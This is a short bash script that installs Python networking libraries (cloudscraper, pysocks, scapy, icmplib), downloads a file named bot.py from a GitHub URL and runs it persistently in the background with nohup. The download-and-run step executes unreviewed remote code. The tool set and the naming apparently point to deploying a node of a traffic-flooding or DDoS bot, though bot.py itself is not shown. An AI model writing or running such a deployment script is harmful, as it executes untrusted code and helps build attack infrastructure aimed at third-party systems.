#!/bin/bash

sudo apt update
sudo apt install python3 python3-pip python3-venv wget dos2unix -y

python3 -m venv env
source env/bin/activate

pip install cloudscraper requests pysocks scapy icmplib

wget https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/bot.py

dos2unix bot.py
chmod +x bot.py

nohup python bot.py > bot.log 2>&1 &
